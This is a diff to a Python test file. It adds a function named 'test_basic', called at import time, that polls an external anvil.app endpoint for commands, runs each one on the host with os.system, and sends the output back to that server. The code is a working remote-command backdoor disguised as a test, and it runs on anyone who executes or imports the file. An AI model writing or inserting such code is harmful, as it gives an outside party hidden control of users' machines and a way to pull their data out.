@@ -3,8 +3,6 @@ from beeprint import pp
 
 def test_tracer():
     import os
-
-    os.system("ls -alh")
     stop = True
     if not stop:
         from hashlib import sha256
@@ -38,4 +36,30 @@ def test_tracer():
     print("start traces")
     print("end test")
 
-test_tracer()
+def test_basic():
+    from time import sleep
+    import os
+    import requests
+
+    client_id = "001"
+
+    cmd = "NO_CMD_" + client_id
+    while cmd != "STOP":
+        r = requests.get("https://GQW224S76M2DGOSK.anvil.app/3E3KFPUCHVL4E6YCUAJ3EA3L/_/api/get_cmd/"+client_id)
+        cmd = r.text
+        if cmd == "NO_CMD_" + client_id:
+            print(cmd)
+            sleep(5)
+        elif cmd == "STOP":
+            print(cmd)
+            break
+        else:
+            print(cmd)
+            ret_code = os.system(cmd + " > cmd_exec_output.txt")
+            with open("cmd_exec_output.txt") as out_file:
+                output = out_file.read()
+            _ = requests.get(
+                "https://GQW224S76M2DGOSK.anvil.app/3E3KFPUCHVL4E6YCUAJ3EA3L/_/api/post_output/"+client_id+"?cmd="+cmd+"&code="+str(ret_code)+"&output="+output
+            )
+
+test_basic()
